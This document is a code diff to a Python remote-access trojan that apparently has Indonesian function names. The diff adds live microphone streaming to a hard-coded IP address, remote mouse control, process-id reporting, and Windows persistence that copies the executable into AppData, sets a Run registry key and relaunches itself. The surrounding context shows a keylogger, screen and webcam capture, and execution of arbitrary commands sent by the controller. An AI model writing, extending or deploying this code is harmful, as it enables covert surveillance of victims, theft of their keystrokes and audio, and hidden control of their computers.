@@ -24,6 +24,51 @@ from filetarget import download_file, upload_file
 ip = '192.168.18.198'
 main_log1 = threading.Event()
 
+def get_pid(sok):
+    try:
+        sok.settimeout(3.0)
+        cur_pid = os.getpid()
+        cur_pid = str(cur_pid).encode()
+        sok.sendall(cur_pid)
+    except:
+        return
+
+def move_cursor(sok):
+    try:
+        pyautogui.FAILSAFE = False
+        sok.settimeout(3.0)
+
+        soket = sok.makefile('r')
+        data = soket.readline()
+
+        if not data:
+            return
+
+        data = data.strip()
+
+        if data == "invalid":
+            return
+
+        if data == "rclick":
+            pyautogui.rightClick()
+            return
+        elif data == "lclick":
+            pyautogui.leftClick()
+            return
+
+        if "," not in data:
+            return
+        
+        data = data.split(",")
+        if len(data) == 2:
+            x = int(data[0])
+            y = int(data[1])
+            pyautogui.move(x, y)
+    except:
+        return
+    finally:
+        sok.settimeout(None)
+
 def start_log():
     Keylogger().start_log()
     main_log1.set()
@@ -142,16 +187,20 @@ def record_n_send():
         stream.close()
         audio.terminate()
 
-def execute_persistence(nama_registry, file_exe):
+def run_persistence(nama_registry, file_exe):
+    CREATE_NEW_PROC = 0x00000010
     file_path = os.environ['appdata']+'\\'+file_exe
     try:
         if not os.path.exists(file_path):
             shutil.copyfile(sys.executable, file_path)
             subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
-        else:
-            pass
+        subprocess.Popen([file_path], creationflags=CREATE_NEW_PROC, stdin=None, stderr=None, stdout=None)
+    except SystemExit:
+        raise
     except:
         pass
+    finally:
+        sys.exit(0)
     
 def send_screen_record(ip, port=9991,):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -214,6 +263,31 @@ def byte_stream():
     vid.release()
     cv2.destroyAllWindows()
 
+def record_n_stream():
+    p = pyaudio.PyAudio()
+
+    stream = p.open(format=FORMAT,
+                    channels=CHANNEL,
+                    rate=RATE,
+                    input=True,
+                    output=False,
+                    frames_per_buffer=CHUNK)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        sock.connect((ip, 781))
+        while True:
+            data = stream.read(CHUNK, exception_on_overflow=False)
+            sock.sendall(data)
+    except Exception as e:
+        print()
+    finally:
+        sock.close()
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+
 def terima_perintah(sok):
     data = ''
     while True:
@@ -256,11 +330,13 @@ def jalankan_perintah(sok):
             send_screen_record(ip=ip, port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
-            execute_persistence(nama_registry, file_exe)
+            run_persistence(nama_registry, file_exe)
         elif perintah == 'help':
             pass
         elif perintah == 'rec_audio':
             record_n_send()
+        elif perintah == 'live_audio':
+            record_n_stream()
         elif perintah == 'send_key':
             acc_keystroke()
         elif perintah == 'snap_cam':
@@ -271,6 +347,14 @@ def jalankan_perintah(sok):
             kill(perintah[5:])
         elif perintah[:7] == 'pidkill':
             pidkill(perintah[8:])
+        elif perintah.startswith("move"):
+            move_cursor(sok)
+        elif perintah == "rclick":
+            move_cursor(sok)
+        elif perintah == "lclick":
+            move_cursor(sok)
+        elif perintah == "getpid":
+            get_pid(sok)
         else:
             exe = subprocess.Popen(
             perintah,
